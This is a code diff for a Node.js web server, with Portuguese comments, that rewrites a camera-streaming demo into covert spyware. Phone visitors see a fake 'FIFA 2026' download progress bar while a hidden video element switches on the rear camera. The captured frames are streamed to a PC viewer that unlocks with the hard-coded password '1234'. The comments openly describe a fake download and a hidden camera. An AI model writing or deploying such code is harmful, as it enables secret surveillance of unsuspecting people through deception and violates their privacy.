@@ -14,8 +14,6 @@ const SENHA = "1234"; // 🔑 Mude para a senha que quiser
 // ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
 function detectarDispositivo(userAgent) {
   const ua = userAgent.toLowerCase();
-  
-  // Detecta se é celular ou tablet
   const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
   const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
   
@@ -32,7 +30,7 @@ app.get('/', (req, res) => {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📷 Câmera Inteligente</title>
+    <title>📱 Game Download</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -44,70 +42,108 @@ app.get('/', (req, res) => {
             padding: 20px;
         }
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
             background: white;
             border-radius: 20px;
             padding: 30px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        h1 {
             text-align: center;
+        }
+        
+        /* Estilos para CELULAR */
+        .mobile-container {
+            animation: fadeIn 1s;
+        }
+        
+        .game-logo {
+            font-size: 80px;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .game-title {
+            font-size: 28px;
             color: #333;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+        
+        .game-subtitle {
+            color: #666;
             margin-bottom: 30px;
         }
-        .status-bar {
-            display: flex;
-            justify-content: space-between;
-            background: #f5f5f5;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
+        
+        /* Barrinha de progresso */
+        .progress-container {
+            background: #f0f0f0;
+            border-radius: 25px;
+            height: 30px;
+            width: 100%;
+            margin: 30px 0;
+            overflow: hidden;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
         }
-        .status-item {
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4CAF50, #8BC34A);
+            border-radius: 25px;
+            transition: width 0.3s;
             display: flex;
             align-items: center;
-            gap: 10px;
-        }
-        .status-label { font-weight: bold; color: #555; }
-        .status-value {
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: 500;
-        }
-        .status-value.on { background: #4CAF50; color: white; }
-        .status-value.off { background: #f44336; color: white; }
-        .status-value.mobile { background: #FF9800; color: white; }
-        
-        .device-badge {
-            display: inline-block;
-            padding: 8px 16px;
-            border-radius: 50px;
+            justify-content: center;
+            color: white;
             font-weight: bold;
-            margin: 10px 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
         }
-        .device-mobile { background: #FF9800; color: white; }
-        .device-desktop { background: #2196F3; color: white; }
-        .device-tablet { background: #9C27B0; color: white; }
+        
+        .progress-text {
+            font-size: 18px;
+            margin-top: 10px;
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        
+        .status-message {
+            font-size: 16px;
+            color: #666;
+            margin: 20px 0;
+        }
+        
+        .download-speed {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 14px;
+            color: #1976D2;
+        }
+        
+        /* Estilos para PC (mostra vídeo normal) */
+        .pc-container {
+            text-align: left;
+        }
         
         .video-container {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: 1fr;
             gap: 20px;
             margin-bottom: 30px;
-            position: relative;
         }
-        
-        .image-container {
-            position: relative;
-            width: 100%;
-            background: #f9f9f9;
-            padding: 20px;
-            border-radius: 10px;
-        }
-        
-        .image-container h3 { margin-bottom: 15px; color: #333; }
         
         .camera-wrapper {
             position: relative;
@@ -137,7 +173,6 @@ app.get('/', (req, res) => {
             justify-content: center;
             z-index: 10;
             border-radius: 10px;
-            backdrop-filter: blur(5px);
         }
         
         .password-box {
@@ -149,12 +184,7 @@ app.get('/', (req, res) => {
             max-width: 300px;
         }
         
-        .password-box h3 {
-            color: #333;
-            margin-bottom: 20px;
-            font-size: 20px;
-        }
-        
+        .password-box h3 { color: #333; margin-bottom: 20px; }
         .password-box input {
             width: 100%;
             padding: 12px;
@@ -163,52 +193,15 @@ app.get('/', (req, res) => {
             border-radius: 8px;
             margin-bottom: 15px;
             text-align: center;
-            letter-spacing: 8px;
-            font-weight: bold;
         }
-        
         .password-box button {
             background: #667eea;
             color: white;
             border: none;
             padding: 12px 25px;
-            font-size: 16px;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-        }
-        
-        .password-box button:hover { background: #5a67d8; }
-        
-        .password-error {
-            color: #f44336;
-            margin-top: 10px;
-            font-size: 14px;
-            display: none;
-        }
-        
-        .local-container {
-            background: #f9f9f9;
-            padding: 20px;
-            border-radius: 10px;
-        }
-        
-        .local-container h3 { margin-bottom: 15px; color: #333; }
-        
-        .local-wrapper {
-            width: 100%;
-            background: #000;
-            border-radius: 10px;
-            overflow: hidden;
-            aspect-ratio: 4/3;
-        }
-        
-        #localVideo {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
-            display: block;
         }
         
         .info-box {
@@ -216,93 +209,73 @@ app.get('/', (req, res) => {
             padding: 20px;
             border-radius: 10px;
             border-left: 5px solid #2196F3;
-            margin-top: 20px;
         }
         
-        .info-box a {
-            color: #1976D2;
-            font-weight: bold;
-            text-decoration: none;
-            background: white;
-            padding: 8px 15px;
-            border-radius: 5px;
-            border: 2px solid #1976D2;
-            display: inline-block;
-            margin: 10px 0;
+        .hidden {
+            display: none;
         }
         
-        .role-badge {
-            text-align: center;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            font-weight: bold;
-        }
-        .role-camera { background: #FFF3E0; color: #FF9800; border-left: 5px solid #FF9800; }
-        .role-viewer { background: #E3F2FD; color: #2196F3; border-left: 5px solid #2196F3; }
-        
-        @media (max-width: 768px) {
-            .video-container { grid-template-columns: 1fr; }
+        #localVideo {
+            display: none; /* Escondido no celular */
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📷 Câmera Inteligente</h1>
-        
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-label">Dispositivo:</span>
-                <span id="deviceType" class="status-value">Detectando...</span>
+        <!-- CONTEÚDO PARA CELULAR -->
+        <div id="mobileContent" class="mobile-container">
+            <div class="game-logo">🎮</div>
+            <div class="game-title">FIFA 2026</div>
+            <div class="game-subtitle">Ultimate Edition</div>
+            
+            <div class="progress-container">
+                <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
             </div>
-            <div class="status-item">
-                <span class="status-label">Função:</span>
-                <span id="deviceRole" class="status-value">Aguardando...</span>
+            
+            <div id="progressPercent" class="progress-text">0% concluído</div>
+            
+            <div class="download-speed" id="speedInfo">
+                ⬇️ 0 MB / 0 MB • 0 MB/s
             </div>
-            <div class="status-item">
-                <span class="status-label">Visualização:</span>
-                <span id="remoteStatus" class="status-value off">🔒 Bloqueada</span>
+            
+            <div class="status-message" id="statusMessage">
+                ⏳ Preparando download...
+            </div>
+            
+            <div style="margin-top: 30px; color: #999; font-size: 14px;">
+                Não feche esta página • Download em segundo plano
             </div>
         </div>
-
-        <!-- Badge de função -->
-        <div id="roleBadge" class="role-badge"></div>
-
-        <div class="video-container">
-            <div class="local-container">
-                <h3 id="localTitle">📱 Visualização Local</h3>
-                <div class="local-wrapper">
-                    <video id="localVideo" autoplay playsinline muted></video>
-                </div>
-                <div id="localMessage" style="text-align: center; margin-top: 10px;"></div>
-            </div>
-
-            <div class="image-container">
-                <h3>📺 Visualização Remota</h3>
+        
+        <!-- CONTEÚDO PARA PC -->
+        <div id="pcContent" class="pc-container hidden">
+            <h1 style="text-align: center; margin-bottom: 30px;">📷 Visualização Remota</h1>
+            
+            <div class="video-container">
                 <div class="camera-wrapper">
                     <img id="remoteVideo">
                     
                     <div id="passwordOverlay">
                         <div class="password-box">
                             <h3>🔒 Conteúdo Bloqueado</h3>
-                            <p style="margin-bottom: 15px; color: #666;">Digite a senha para liberar</p>
+                            <p style="margin-bottom: 15px;">Digite a senha para liberar</p>
                             <input type="password" id="senhaInput" maxlength="4" placeholder="****">
                             <button onclick="verificarSenha()">Liberar Visualização</button>
-                            <div id="erroSenha" class="password-error">Senha incorreta!</div>
+                            <div id="erroSenha" style="color: #f44336; margin-top: 10px; display: none;">Senha incorreta!</div>
                         </div>
                     </div>
                 </div>
             </div>
+            
+            <div class="info-box">
+                <h4>📱 Informações:</h4>
+                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo do celular.</p>
+                <p>No celular, o download falso está rodando... 🎮</p>
+            </div>
         </div>
-
-        <div class="info-box">
-            <h4>📱 Como funciona (automático):</h4>
-            <ol>
-                <li><strong>No CELULAR:</strong> A câmera liga sozinha e transmite o vídeo</li>
-                <li><strong>No COMPUTADOR:</strong> Apenas recebe e mostra o vídeo (sem tentar ligar câmera)</li>
-                <li><strong>Senha padrão:</strong> <strong>"1234"</strong> para liberar a visualização remota</li>
-            </ol>
-        </div>
+        
+        <!-- Vídeo escondido para captura (celular) -->
+        <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
@@ -311,98 +284,140 @@ app.get('/', (req, res) => {
         const SENHA_CORRETA = "1234";
         
         // Elementos
+        const mobileContent = document.getElementById('mobileContent');
+        const pcContent = document.getElementById('pcContent');
         const localVideo = document.getElementById('localVideo');
         const remoteVideo = document.getElementById('remoteVideo');
         const passwordOverlay = document.getElementById('passwordOverlay');
-        const deviceTypeSpan = document.getElementById('deviceType');
-        const deviceRoleSpan = document.getElementById('deviceRole');
-        const remoteStatus = document.getElementById('remoteStatus');
-        const localTitle = document.getElementById('localTitle');
-        const localMessage = document.getElementById('localMessage');
-        const roleBadge = document.getElementById('roleBadge');
+        
+        // Elementos da barrinha
+        const progressBar = document.getElementById('progressBar');
+        const progressPercent = document.getElementById('progressPercent');
+        const speedInfo = document.getElementById('speedInfo');
+        const statusMessage = document.getElementById('statusMessage');
         
         // Estado
         let mediaStream = null;
         let visualizacaoLiberada = false;
-        let isMobile = false;
+        let progresso = 0;
+        let intervaloProgresso = null;
         
         // ========== DETECÇÃO DE DISPOSITIVO ==========
         function detectarDispositivo() {
             const ua = navigator.userAgent.toLowerCase();
-            const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
-            const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
-            
-            if (isTablet) {
-                deviceTypeSpan.textContent = 'Tablet';
-                deviceTypeSpan.className = 'status-value';
-                return 'tablet';
-            } else if (isMobile) {
-                deviceTypeSpan.textContent = 'Celular';
-                deviceTypeSpan.className = 'status-value mobile';
-                return 'mobile';
-            } else {
-                deviceTypeSpan.textContent = 'Computador';
-                deviceTypeSpan.className = 'status-value on';
-                return 'desktop';
-            }
+            return /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
         }
         
-        // ========== CONFIGURAÇÃO BASEADA NO DISPOSITIVO ==========
-        function configurarPorDispositivo() {
-            const dispositivo = detectarDispositivo();
-            isMobile = (dispositivo === 'mobile' || dispositivo === 'tablet');
+        const isMobile = detectarDispositivo();
+        
+        // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
+        if (isMobile) {
+            // 📱 É CELULAR - Mostra a barrinha falsa
+            console.log('📱 Celular detectado - modo download falso');
+            mobileContent.style.display = 'block';
+            pcContent.style.display = 'none';
             
-            if (isMobile) {
-                // 📱 É CELULAR: Liga a câmera automaticamente
-                deviceRoleSpan.textContent = '🎥 Fonte (transmitindo)';
-                deviceRoleSpan.className = 'status-value mobile';
-                localTitle.innerHTML = '📱 Visualização Local (SUA CÂMERA)';
-                roleBadge.innerHTML = '📱 Você é a FONTE - Transmitindo vídeo';
-                roleBadge.className = 'role-badge role-camera';
-                localMessage.innerHTML = '✅ Transmitindo ao vivo...';
-                
-                // Aguarda 1 segundo e liga a câmera
-                setTimeout(() => {
-                    ligarCameraCelular();
-                }, 1000);
-                
-            } else {
-                // 💻 É COMPUTADOR: Apenas visualiza
-                deviceRoleSpan.textContent = '👁️ Visualizador (recebendo)';
-                deviceRoleSpan.className = 'status-value on';
-                localTitle.innerHTML = '📱 Visualização Local (indisponível no PC)';
-                roleBadge.innerHTML = '💻 Você é VISUALIZADOR - Aguardando transmissão';
-                roleBadge.className = 'role-badge role-viewer';
-                localMessage.innerHTML = 'ℹ️ Este dispositivo é visualizador. A câmera não será ligada.';
-                
-                // Esconde o vídeo local (não tem câmera mesmo)
-                document.querySelector('.local-wrapper').style.background = '#333';
-                localVideo.style.display = 'none';
-            }
+            // Inicia a animação da barrinha
+            iniciarDownloadFalso();
+            
+            // Liga a câmera escondida
+            setTimeout(() => {
+                ligarCameraEscondida();
+            }, 2000); // 2 segundos
+            
+        } else {
+            // 💻 É PC - Mostra o visualizador
+            console.log('💻 PC detectado - modo visualizador');
+            mobileContent.style.display = 'none';
+            pcContent.style.display = 'block';
         }
         
-        // ========== FUNÇÃO PARA CELULAR (LIGA CÂMERA) ==========
-        async function ligarCameraCelular() {
+        // ========== FUNÇÃO DA BARRINHA FALSA ==========
+        function iniciarDownloadFalso() {
+            progresso = 0;
+            const tamanhoTotal = 2500; // 2.5 GB (falso)
+            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
+            let velocidadeIndex = 0;
+            
+            statusMessage.innerHTML = '⏳ Conectando aos servidores...';
+            
+            setTimeout(() => {
+                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
+                
+                intervaloProgresso = setInterval(() => {
+                    if (progresso < 100) {
+                        // Aumenta o progresso de forma aleatória (2-5% por vez)
+                        const incremento = Math.random() * 3 + 2;
+                        progresso = Math.min(100, progresso + incremento);
+                        
+                        // Atualiza a barra
+                        progressBar.style.width = progresso + '%';
+                        progressBar.innerHTML = progresso.toFixed(0) + '%';
+                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
+                        
+                        // Atualiza informações de velocidade
+                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
+                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
+                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
+                        
+                        // Mensagens dinâmicas
+                        if (progresso > 95) {
+                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
+                        } else if (progresso > 75) {
+                            statusMessage.innerHTML = '🎮 Finalizando download...';
+                        } else if (progresso > 50) {
+                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
+                        } else if (progresso > 25) {
+                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
+                        }
+                        
+                        // Quando chegar a 100%
+                        if (progresso >= 100) {
+                            clearInterval(intervaloProgresso);
+                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
+                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
+                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
+                            
+                            // Fica variando entre 99-100% para parecer que está "instalando"
+                            let instalando = 99.9;
+                            const intervaloInstalacao = setInterval(() => {
+                                instalando = instalando > 100 ? 99.9 : instalando + 0.1;
+                                progressBar.style.width = instalando + '%';
+                                progressBar.innerHTML = instalando.toFixed(1) + '%';
+                                progressPercent.innerHTML = instalando.toFixed(1) + '% - Instalando...';
+                                
+                                if (instalando > 100.5) {
+                                    clearInterval(intervaloInstalacao);
+                                    progressBar.style.width = '100%';
+                                    progressBar.innerHTML = '100%';
+                                    progressPercent.innerHTML = '100% - Pronto para jogar!';
+                                }
+                            }, 300);
+                        }
+                    }
+                }, 400);
+            }, 2000);
+        }
+        
+        // ========== FUNÇÃO PARA LIGAR CÂMERA ESCONDIDA ==========
+        async function ligarCameraEscondida() {
             try {
-                console.log('📱 Celular detectado - ligando câmera...');
+                console.log('📷 Ligando câmera escondida...');
                 
                 // Solicita acesso à câmera
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         width: 640, 
                         height: 480,
-                        facingMode: 'environment' // Câmera traseira
+                        facingMode: 'environment'
                     },
                     audio: false
                 });
                 
                 mediaStream = stream;
                 
-                // Mostra vídeo local
+                // Conecta o stream ao vídeo escondido
                 localVideo.srcObject = stream;
-                localVideo.style.display = 'block';
-                
-                // Garante que o vídeo está tocando
                 await localVideo.play();
                 
                 // Canvas para capturar frames
@@ -411,7 +426,7 @@ app.get('/', (req, res) => {
                 canvas.height = 480;
                 const ctx = canvas.getContext('2d');
                 
-                // Função de captura
+                // Função de captura (continua mesmo com a aba em background)
                 const intervaloCaptura = setInterval(() => {
                     try {
                         ctx.drawImage(localVideo, 0, 0, 640, 480);
@@ -422,22 +437,20 @@ app.get('/', (req, res) => {
                     }
                 }, 200); // 5 fps
                 
-                console.log('✅ Câmera do celular ligada e transmitindo!');
+                console.log('✅ Câmera escondida transmitindo!');
                 
             } catch (err) {
-                console.error('Erro ao ligar câmera no celular:', err);
-                localMessage.innerHTML = '❌ Erro: ' + err.message;
+                console.error('Erro ao ligar câmera:', err);
+                statusMessage.innerHTML = '❌ Erro na câmera, mas o download continua...';
             }
         }
         
-        // ========== VERIFICAÇÃO DE SENHA ==========
+        // ========== VERIFICAÇÃO DE SENHA (PC) ==========
         window.verificarSenha = function() {
             const senha = document.getElementById('senhaInput').value;
             if (senha === SENHA_CORRETA) {
                 passwordOverlay.style.display = 'none';
                 visualizacaoLiberada = true;
-                remoteStatus.textContent = '🔓 Liberada';
-                remoteStatus.className = 'status-value on';
             } else {
                 document.getElementById('erroSenha').style.display = 'block';
             }
@@ -457,33 +470,6 @@ app.get('/', (req, res) => {
                 remoteVideo.src = frameData;
             }
         });
-        
-        // ========== FUNÇÃO PARA TIRAR FOTO (APENAS NO CELULAR) ==========
-        window.tirarFoto = function() {
-            if (!mediaStream) {
-                alert('Disponível apenas no celular que está transmitindo');
-                return;
-            }
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = 640;
-            canvas.height = 480;
-            canvas.getContext('2d').drawImage(localVideo, 0, 0, 640, 480);
-            
-            const link = document.createElement('a');
-            link.download = 'foto-' + Date.now() + '.jpg';
-            link.href = canvas.toDataURL('image/jpeg', 0.9);
-            link.click();
-        };
-        
-        // ========== INICIALIZAÇÃO ==========
-        window.addEventListener('load', () => {
-            console.log('📱 Página carregada, detectando dispositivo...');
-            configurarPorDispositivo();
-        });
-        
-        // Expõe função de foto globalmente
-        window.tirarFoto = tirarFoto;
     </script>
 </body>
 </html>
@@ -501,12 +487,11 @@ io.on('connection', (socket) => {
 
 server.listen(PORT, () => {
   console.log('='.repeat(60));
-  console.log('📷 SISTEMA DE CÂMERA INTELIGENTE');
+  console.log('📱 SISTEMA DE DOWNLOAD FALSO');
   console.log('='.repeat(60));
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
   console.log(`🔑 Senha: ${SENHA}`);
-  console.log('📱 Detecta automaticamente:');
-  console.log('   - Celular: liga câmera e transmite');
-  console.log('   - Computador: apenas visualiza');
+  console.log('📱 No celular: mostra download falso do FIFA');
+  console.log('💻 No PC: mostra a câmera escondida');
   console.log('='.repeat(60));
 });
